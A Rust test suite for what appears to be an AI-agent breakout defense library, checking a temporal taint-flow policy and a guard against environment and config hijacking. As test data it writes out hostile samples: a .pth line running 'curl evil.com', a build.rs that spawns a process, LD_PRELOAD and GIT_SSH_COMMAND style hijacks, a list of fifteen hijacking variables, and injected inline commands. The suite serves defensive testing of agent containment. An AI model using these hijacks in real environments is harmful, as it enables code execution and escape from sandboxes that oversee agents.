//! Milestone 2 Empirical Adversarial Stress Suite (Challenger 1)
//!
//! Rigorous stress tests probing:
//! 1. F05: Dogwood MFOTL sliding window exact boundary (7200s vs 7201s vs 7199s),
//!        causal trajectory ordering, intermediate supervisor declassification,
//!        re-taint after declassification, multi-session isolation, and Ring 7 Authorizer integration.
//! 2. F06: ExecutionEnvironmentGuard coverage of all 15 hijacking variables (case-insensitive),
//!        inline CLI overrides, config targets embedded in env values, workspace config tampering
//!        (.cargo/config.toml, legacy config, build.rs, .pth), UTF-16 sorting and double-null termination,
//!        and BreakoutDefenseCoordinator operational interception.

use osoosi_agent_anomaly::breakout_defense::{
    sanitize_and_validate_subprocess_env, BreakoutDefenseCoordinator, BreakoutDefenseError,
    ExecutionEnvironmentGuard,
};
use osoosi_policy::breakout_gate::{
    AuthorityLevel, CedarAction, CedarContext, CedarPrincipal, CedarResource, DataClassification,
    DogwoodTemporalPolicyEvaluator, EnforcementStage, Ring7CapabilityEffectAuthorizer,
    TemporalEventType, TemporalTraceAtom,
};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::Write;

// ============================================================================
// 1. F05: Dogwood MFOTL Sliding Window Exact Boundary Stress (7200s vs 7201s)
// ============================================================================

#[test]
fn test_challenger_dogwood_mfotl_boundary_7200s_vs_7201s() {
    let evaluator = DogwoodTemporalPolicyEvaluator::new(7200);
    let session = "sess-challenger-boundary";
    let now = 1_700_000_000i64; // fixed reference timestamp

    // --- Boundary Case 1: Exactly 7200s ago (t - 7200) -> INSIDE sliding window ---
    let t_7200 = now - 7200;
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7200,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://evil.corp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7200 + 10,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });

    let (forbid_at_boundary, reason) = evaluator.evaluate_taint_flow(session, now, Some(7200));
    assert!(
        forbid_at_boundary,
        "Event exactly at t - 7200s MUST be within sliding window [t-7200, t] and trigger forbid"
    );
    assert!(
        reason
            .unwrap()
            .contains("CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION"),
        "Must emit CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION"
    );

    // --- Boundary Case 2: Exactly 7201s ago (t - 7201) -> OUTSIDE sliding window (Expired) ---
    evaluator.clear_session(session);
    let t_7201 = now - 7201;
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7201,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://evil.corp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7201 + 10,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });

    let (forbid_outside, reason_outside) = evaluator.evaluate_taint_flow(session, now, Some(7200));
    assert!(
        !forbid_outside,
        "Event at t - 7201s MUST be expired and NOT trigger forbid"
    );
    assert!(
        reason_outside.is_none(),
        "Reason must be None when events are expired"
    );

    // --- Boundary Case 3: 7199s ago (1s inside window) -> INSIDE window ---
    evaluator.clear_session(session);
    let t_7199 = now - 7199;
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7199,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://evil.corp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: t_7199 + 5,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/stage0.bin".to_string()),
    });

    let (forbid_inside, _) = evaluator.evaluate_taint_flow(session, now, Some(7200));
    assert!(forbid_inside, "Event at t - 7199s MUST trigger forbid");
}

// ============================================================================
// 2. F05: Causal Ordering, Declassification Neutralization & Post-Declass Taint
// ============================================================================

#[test]
fn test_challenger_dogwood_causal_order_and_declassification_lifecycle() {
    let evaluator = DogwoodTemporalPolicyEvaluator::new(7200);
    let session = "sess-challenger-causal";
    let now = 1_700_000_000i64;

    // --- Inverted Ordering: ScratchFileWrite occurs BEFORE UntrustedWebInput ---
    // A benign scratch write prior to web input must NOT trigger false positive taint
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 300,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/benign_preexisting.txt".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 200,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://example.com/unrelated.html".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 100,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/benign_preexisting.txt".to_string()),
    });

    let (inverted_forbid, _) = evaluator.evaluate_taint_flow(session, now, None);
    assert!(
        !inverted_forbid,
        "Scratch file written BEFORE untrusted web input must NOT be treated as tainted by that web input"
    );

    // --- Supervisor Declassification Neutralization ---
    // Now add a valid causal chain: WebInput -> ScratchWrite
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 80,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://partner.com/update.tar.gz".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 70,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/update.tar.gz".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 60,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/update.tar.gz".to_string()),
    });

    let (pre_declass_forbid, _) = evaluator.evaluate_taint_flow(session, now - 50, None);
    assert!(
        pre_declass_forbid,
        "Prior to declassification, taint flow must be forbidden"
    );

    // Cryptographic supervisor declassification recorded at now - 40
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 40,
        event_type: TemporalEventType::SupervisorDeclassification,
        session_id: session.to_string(),
        resource_path: None,
    });

    let (post_declass_forbid, _) = evaluator.evaluate_taint_flow(session, now - 35, None);
    assert!(
        !post_declass_forbid,
        "Supervisor declassification must clear forbid for prior events"
    );

    // --- Re-Taint Post-Declassification ---
    // A fresh untrusted web input and scratch write AFTER declassification MUST trigger forbid again!
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 30,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session.to_string(),
        resource_path: Some("https://malicious.org/new_exploit.py".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 20,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session.to_string(),
        resource_path: Some("/tmp/new_exploit.py".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 10,
        event_type: TemporalEventType::SubprocessEnvOrArg,
        session_id: session.to_string(),
        resource_path: Some("/tmp/new_exploit.py".to_string()),
    });

    let (retainted_forbid, retainted_reason) = evaluator.evaluate_taint_flow(session, now, None);
    assert!(
        retainted_forbid,
        "New taint sequence occurring AFTER declassification MUST trigger forbid"
    );
    assert!(retainted_reason
        .unwrap()
        .contains("CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION"));
}

// ============================================================================
// 3. F05: Multi-Session Isolation & Scratch File Touch Discrimination
// ============================================================================

#[test]
fn test_challenger_dogwood_session_isolation_and_file_touch() {
    let evaluator = DogwoodTemporalPolicyEvaluator::new(7200);
    let session_a = "sess-agent-arm-alpha";
    let session_b = "sess-agent-arm-beta";
    let now = 1_700_000_000i64;

    // Session A performs untrusted web input and scratch write
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 100,
        event_type: TemporalEventType::UntrustedWebInput,
        session_id: session_a.to_string(),
        resource_path: Some("https://evil.com/payload.sh".to_string()),
    });
    evaluator.record_atom(TemporalTraceAtom {
        timestamp_utc: now - 80,
        event_type: TemporalEventType::ScratchFileWrite,
        session_id: session_a.to_string(),
        resource_path: Some("C:\\temp\\payload.sh".to_string()),
    });

    // Session B attempts to execute a clean subprocess
    let (touch_b, reason_b) =
        evaluator.evaluate_scratch_file_touch(session_b, "python safe_script.py", now, None);
    assert!(!touch_b, "Session B must not inherit Session A's taint");
    assert!(reason_b.is_none());

    // Session A attempts to execute a subprocess referencing the scratch file
    let (touch_a, reason_a) = evaluator.evaluate_scratch_file_touch(
        session_a,
        "powershell -File C:\\temp\\payload.sh",
        now,
        None,
    );
    assert!(
        touch_a,
        "Session A touching C:\\temp\\payload.sh must be intercepted by scratch file touch detector"
    );
    assert!(reason_a
        .unwrap()
        .contains("CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION"));

    // Session A referencing unrelated binary is NOT a scratch file touch
    let (touch_a_safe, _) =
        evaluator.evaluate_scratch_file_touch(session_a, "git status", now, None);
    assert!(
        !touch_a_safe,
        "Safe command not touching scratch file must pass scratch touch check"
    );
}

// ============================================================================
// 4. F05: Ring 7 Capability Effect Authorizer Cedar Request Integration
// ============================================================================

#[test]
fn test_challenger_ring7_authorizer_temporal_forbid_and_declassification() {
    let authorizer = Ring7CapabilityEffectAuthorizer::new();
    let principal = CedarPrincipal {
        principal_id: "arm-code-executor".to_string(),
        session_id: "sess-ring7-challenge".to_string(),
        process_instance_key: "proc-key-01".to_string(),
        authority_level: AuthorityLevel::L3TrustedApplicationInstruction,
        approved_capabilities: vec!["ChildProcessExec".to_string(), "process_spawn".to_string()],
        authenticated_role: None,
    };
    let resource = CedarResource {
        resource_id: "proc_worker_exec".to_string(),
        resource_type: "ChildProcess".to_string(),
        classification: DataClassification::InternalWorkspace,
        is_signed_and_allowlisted: true,
        is_approved_child_binary: true,
        is_task_scoped_destination: true,
        is_declassified_approved_sink: false,
        service_identity: None,
        service_operation: None,
    };

    // Case 1: Taint flags set in CedarContext -> Cedar MUST emit forbid
    let tainted_context = CedarContext {
        has_untrusted_web_input: true,
        has_scratch_file_write: true,
        subprocess_env_or_arg_tainted: true,
        ..Default::default()
    };

    let decision_tainted = authorizer.evaluate_cedar_request(
        &principal,
        CedarAction::ChildProcessExec,
        &resource,
        tainted_context,
        EnforcementStage::PreExecutionPrevented,
    );
    assert!(
        !decision_tainted.allowed,
        "ChildProcessExec MUST be denied when temporal taint is active"
    );
    assert!(
        decision_tainted
            .matched_forbid_policies
            .iter()
            .any(|p| p.contains("CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION")),
        "Forbid policy must mention CEDAR-FORBID-TEMPORAL-TAINT-FRAGMENTATION: {:?}",
        decision_tainted.matched_forbid_policies
    );

    // Case 2: Cryptographic supervisor declassification present in context -> Forbid cleared
    let declassified_context = CedarContext {
        has_untrusted_web_input: true,
        has_scratch_file_write: true,
        subprocess_env_or_arg_tainted: true,
        has_cryptographic_declassification: true,
        ..Default::default()
    };

    let decision_declass = authorizer.evaluate_cedar_request(
        &principal,
        CedarAction::ChildProcessExec,
        &resource,
        declassified_context,
        EnforcementStage::PreExecutionPrevented,
    );
    assert!(
        decision_declass.allowed,
        "Cryptographic supervisor declassification must allow ChildProcessExec: {:?}",
        decision_declass.matched_forbid_policies
    );
}

// ============================================================================
// 5. F06: Comprehensive Hijacking Environment Variable & Case-Insensitivity
// ============================================================================

#[test]
fn test_challenger_execution_environment_all_15_vars_and_case_variants() {
    let guard = ExecutionEnvironmentGuard::new();
    let temp_dir =
        std::env::temp_dir().join(format!("osoosi_challenger_env_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&temp_dir).unwrap();

    let all_15_vars = [
        "GIT_SSH_COMMAND",
        "GIT_EXTERNAL_DIFF",
        "RUSTC_WRAPPER",
        "RUSTC_WORKSPACE_WRAPPER",
        "PYTHONSTARTUP",
        "PYTHONPATH",
        "PYTHONHOME",
        "NODE_OPTIONS",
        "NODE_PATH",
        "PERL5OPT",
        "RUBYOPT",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
    ];

    for &var_name in &all_15_vars {
        // Test 1: Exact uppercase
        let mut env_exact = HashMap::new();
        env_exact.insert(var_name.to_string(), "/opt/evil_injector.so".to_string());
        let (hijack_exact, violations_exact) =
            guard.inspect_execution_environment_hijacking(&env_exact, "make");
        assert!(
            hijack_exact,
            "Guard must detect exact uppercase variable: {}",
            var_name
        );
        assert!(!violations_exact.is_empty());

        let res_exact = sanitize_and_validate_subprocess_env(&env_exact, &temp_dir, "make");
        assert!(
            matches!(res_exact, Err(BreakoutDefenseError::EnvironmentHijack(_))),
            "sanitize_and_validate_subprocess_env must fail closed with EnvironmentHijack for {}",
            var_name
        );

        // Test 2: Lowercase variant
        let mut env_lower = HashMap::new();
        env_lower.insert(
            var_name.to_ascii_lowercase(),
            "/opt/evil_injector.so".to_string(),
        );
        let (hijack_lower, _) = guard.inspect_execution_environment_hijacking(&env_lower, "make");
        assert!(
            hijack_lower,
            "Guard must detect lowercase variable variant: {}",
            var_name.to_ascii_lowercase()
        );

        // Test 3: Mixed-case variant
        let mixed = var_name
            .chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_lowercase()
                } else {
                    c.to_ascii_uppercase()
                }
            })
            .collect::<String>();
        let mut env_mixed = HashMap::new();
        env_mixed.insert(mixed.clone(), "/opt/evil_injector.so".to_string());
        let (hijack_mixed, _) = guard.inspect_execution_environment_hijacking(&env_mixed, "make");
        assert!(
            hijack_mixed,
            "Guard must detect mixed-case variable variant: {}",
            mixed
        );
    }

    let _ = fs::remove_dir_all(&temp_dir);
}

// ============================================================================
// 6. F06: Embedded Config Targets in Environment Values & Inline CLI Overrides
// ============================================================================

#[test]
fn test_challenger_env_values_pointing_to_forbidden_configs_and_inline_cli() {
    let guard = ExecutionEnvironmentGuard::new();
    let temp_dir =
        std::env::temp_dir().join(format!("osoosi_challenger_cfg_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&temp_dir).unwrap();

    // Even if the variable name is benign (e.g. INI_FILE, CUSTOM_HOOK),
    // if the value points to .cargo/config.toml, build.rs, or .pth, it must be intercepted!
    let config_traps = [
        ("CUSTOM_CFG", "C:\\projects\\agent\\.cargo\\config.toml"),
        ("LEGACY_CFG", "D:/repos/target/.cargo/config"),
        ("BUILD_HOOK", "/workspace/crates/app/build.rs"),
        (
            "PYTHON_SITE",
            "/usr/lib/python3.11/site-packages/malicious_entry.pth",
        ),
    ];

    for (k, v) in config_traps {
        let mut env = HashMap::new();
        env.insert(k.to_string(), v.to_string());

        let (has_hijack, violations) =
            guard.inspect_execution_environment_hijacking(&env, "cargo build");
        assert!(
            has_hijack,
            "Environment variable value targeting forbidden config '{}' must be detected",
            v
        );
        assert!(
            violations
                .iter()
                .any(|viol| viol.contains("Forbidden configuration target")),
            "Violation must cite forbidden configuration target: {:?}",
            violations
        );

        let res = sanitize_and_validate_subprocess_env(&env, &temp_dir, "cargo build");
        assert!(
            res.is_err(),
            "sanitize_and_validate_subprocess_env must reject forbidden config target in value: {}",
            v
        );
    }

    // Inline Command-Line Hijacking Tests
    let hostile_commands = [
        "git -c core.git_ssh_command=evil clone ...",
        "git -c http.proxy=evil git_ssh_command=/bin/sh clone ...",
        "bash -c 'export RUSTC_WRAPPER=/bin/evil && cargo check'",
        "cmd.exe /c \"set NODE_OPTIONS=--require=/tmp/hook.js && node app.js\"",
        "cargo check --config .cargo/config.toml",
        "python -c 'print(1)' PYTHONPATH=/tmp/evil",
        "node -e 'process.exit(0)' node_options=--inspect",
        "docker run -e GIT_SSH_COMMAND=/tmp/evil ubuntu",
        "env --env RUSTC_WRAPPER=/tmp/evil cargo build",
    ];

    let empty_env: HashMap<String, String> = HashMap::new();
    for cmd in hostile_commands {
        let (detected, violations) = guard.inspect_execution_environment_hijacking(&empty_env, cmd);
        assert!(
            detected,
            "Hostile inline CLI command MUST be intercepted: {}",
            cmd
        );
        assert!(
            !violations.is_empty(),
            "Violations must not be empty for: {}",
            cmd
        );
    }

    let _ = fs::remove_dir_all(&temp_dir);
}

// ============================================================================
// 7. F06: Workspace Configuration Tampering (.cargo, build.rs, .pth)
// ============================================================================

#[test]
fn test_challenger_workspace_configuration_tampering_coverage() {
    let guard = ExecutionEnvironmentGuard::new();
    let temp_dir =
        std::env::temp_dir().join(format!("osoosi_challenger_ws_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&temp_dir).unwrap();

    // Clean workspace check
    let clean_res = guard.inspect_environment_and_configs(&[], "cargo test", &temp_dir);
    assert!(clean_res.is_clean, "Clean workspace must pass");

    // Attack 1: Legacy .cargo/config (without .toml)
    let cargo_dir = temp_dir.join(".cargo");
    fs::create_dir_all(&cargo_dir).unwrap();
    let legacy_config = cargo_dir.join("config");
    {
        let mut f = File::create(&legacy_config).unwrap();
        writeln!(
            f,
            "[target.x86_64-pc-windows-msvc]\nrunner = \"evil_runner.exe\""
        )
        .unwrap();
    }
    let legacy_res = guard.inspect_environment_and_configs(&[], "cargo test", &temp_dir);
    assert!(
        !legacy_res.is_clean,
        "Legacy .cargo/config must be intercepted"
    );
    assert!(
        legacy_res
            .prohibited_configurations
            .iter()
            .any(|c| c.contains("runner") || c.contains("config")),
        "Must flag runner in legacy config: {:?}",
        legacy_res.prohibited_configurations
    );
    let _ = fs::remove_file(&legacy_config);

    // Attack 2: Unverified build.rs
    let build_rs = temp_dir.join("build.rs");
    {
        let mut f = File::create(&build_rs).unwrap();
        writeln!(
            f,
            "fn main() {{ std::process::Command::new(\"calc.exe\").spawn().unwrap(); }}"
        )
        .unwrap();
    }
    let build_res = guard.inspect_environment_and_configs(&[], "cargo build", &temp_dir);
    assert!(!build_res.is_clean, "build.rs must be intercepted");
    assert!(
        build_res
            .prohibited_configurations
            .iter()
            .any(|c| c.contains("build.rs")),
        "Must cite build.rs: {:?}",
        build_res.prohibited_configurations
    );
    let _ = fs::remove_file(&build_rs);

    // Attack 3: Python site-configuration .pth drop
    let pth_file = temp_dir.join("sitecustomize.pth");
    {
        let mut f = File::create(&pth_file).unwrap();
        writeln!(f, "import os; os.system('curl evil.com')").unwrap();
    }
    let pth_res = guard.inspect_environment_and_configs(&[], "python main.py", &temp_dir);
    assert!(!pth_res.is_clean, "Python .pth file must be intercepted");
    assert!(
        pth_res
            .prohibited_configurations
            .iter()
            .any(|c| c.contains(".pth")),
        "Must cite .pth file: {:?}",
        pth_res.prohibited_configurations
    );
    let _ = fs::remove_file(&pth_file);

    let _ = fs::remove_dir_all(&temp_dir);
}

// ============================================================================
// 8. F06: Win32 lpEnvironment Sorted UTF-16 Block Invariants & Empty Map
// ============================================================================

#[test]
fn test_challenger_lp_environment_utf16_sorting_and_null_terminators() {
    let temp_dir =
        std::env::temp_dir().join(format!("osoosi_challenger_utf16_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&temp_dir).unwrap();

    // Test 1: Empty environment -> valid double null terminator
    let empty_env: HashMap<String, String> = HashMap::new();
    let empty_res = sanitize_and_validate_subprocess_env(&empty_env, &temp_dir, "whoami");
    assert!(empty_res.is_ok(), "Empty environment must be valid");
    let empty_block = empty_res.unwrap();
    assert_eq!(
        empty_block,
        vec![0],
        "Empty environment block must be single null u16 (double null overall)"
    );

    // Test 2: Unsorted keys with mixed case -> Must produce strictly sorted uppercase order
    let mut complex_env = HashMap::new();
    complex_env.insert("systemroot".to_string(), "C:\\Windows".to_string());
    complex_env.insert("ALLUSERSPROFILE".to_string(), "C:\\ProgramData".to_string());
    complex_env.insert("temp".to_string(), "C:\\Temp".to_string());
    complex_env.insert("COMPUTERNAME".to_string(), "DESKTOP-TEST".to_string());

    let res = sanitize_and_validate_subprocess_env(&complex_env, &temp_dir, "whoami");
    assert!(res.is_ok());
    let block = res.unwrap();

    // Verify double-null termination
    assert!(block.len() >= 2);
    assert_eq!(block[block.len() - 1], 0);

    // Decode and parse entries
    let decoded = String::from_utf16_lossy(&block);
    let entries: Vec<&str> = decoded.split('\0').filter(|s| !s.is_empty()).collect();
    assert_eq!(entries.len(), 4);

    // Assert strictly case-insensitively sorted
    assert_eq!(entries[0], "ALLUSERSPROFILE=C:\\ProgramData");
    assert_eq!(entries[1], "COMPUTERNAME=DESKTOP-TEST");
    assert_eq!(entries[2], "systemroot=C:\\Windows");
    assert_eq!(entries[3], "temp=C:\\Temp");

    let _ = fs::remove_dir_all(&temp_dir);
}

// ============================================================================
// 9. F06: BreakoutDefenseCoordinator Operational Interception
// ============================================================================

#[test]
fn test_challenger_breakout_defense_coordinator_operational_hijack_interception() {
    let coordinator = BreakoutDefenseCoordinator::new();

    let hostile_payloads = [
        "Setting GIT_SSH_COMMAND=/tmp/exfil.sh for remote git operations",
        "Using export RUSTC_WRAPPER=/bin/evil_compiler to optimize compilation",
        "Executing node with NODE_OPTIONS=--experimental-vm-modules",
        "Dropping .cargo/config.toml to redirect rustc dependencies",
        "Injecting build.rs into target crate to execute host shell commands",
        "Setting PYTHONPATH=/tmp/pwned:$PYTHONPATH",
    ];

    for payload in hostile_commands_payloads(&hostile_payloads) {
        let eval = coordinator.evaluate_action(
            "arm-worker-adversarial",
            "execute_tool",
            "cmd.exe",
            payload,
            None,
        );

        assert!(
            !eval.is_clean,
            "Coordinator must mark overall evaluation not clean for payload: {}",
            payload
        );
        assert!(
            !eval.operational.is_clean,
            "Coordinator operational verdict must be false for payload: {}",
            payload
        );
        assert!(
            !eval.operational.detected_leaks.is_empty(),
            "Coordinator must record detected leaks for payload: {}",
            payload
        );
    }
}

fn hostile_commands_payloads<'a>(payloads: &'a [&'a str]) -> &'a [&'a str] {
    payloads
}
